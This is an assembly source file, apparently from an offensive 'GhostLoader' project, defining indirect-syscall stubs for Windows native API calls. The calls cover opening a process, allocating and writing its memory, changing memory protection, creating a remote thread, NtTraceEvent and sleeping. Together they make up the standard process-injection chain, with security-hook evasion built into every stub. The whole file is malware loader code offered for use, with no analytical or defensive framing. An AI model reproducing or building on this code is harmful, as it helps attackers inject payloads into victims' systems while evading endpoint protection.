# =============================================
# syscalls.asm - GhostLoader by nobodyroot
# Compatible con MinGW-w64 (x86-64) update v1.1
# =============================================

.intel_syntax noprefix

.extern g_SyscallSSN
.extern g_SyscallGadget

NtOpenProcess:
    mov r10, rcx
    mov eax, dword ptr [rip + g_SyscallSSN]
    jmp qword ptr [rip + g_SyscallGadget]
    ret

NtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, dword ptr [rip + g_SyscallSSN]
    jmp qword ptr [rip + g_SyscallGadget]
    ret

NtWriteVirtualMemory:
    mov r10, rcx
    mov eax, dword ptr [rip + g_SyscallSSN]
    jmp qword ptr [rip + g_SyscallGadget]
    ret

NtProtectVirtualMemory:
    mov r10, rcx
    mov eax, dword ptr [rip + g_SyscallSSN]
    jmp qword ptr [rip + g_SyscallGadget]
    ret

NtCreateThreadEx:
    mov r10, rcx
    mov eax, dword ptr [rip + g_SyscallSSN]
    jmp qword ptr [rip + g_SyscallGadget]
    ret

NtWaitForSingleObject:
    mov r10, rcx
    mov eax, dword ptr [rip + g_SyscallSSN]
    jmp qword ptr [rip + g_SyscallGadget]
    ret

NtTraceEvent:
    mov r10, rcx
    mov eax, dword ptr [rip + g_SyscallSSN]
    jmp qword ptr [rip + g_SyscallGadget]
    ret

NtDelayExecution:
    mov r10, rcx
    mov eax, dword ptr [rip + g_SyscallSSN]
    jmp qword ptr [rip + g_SyscallGadget]
    ret
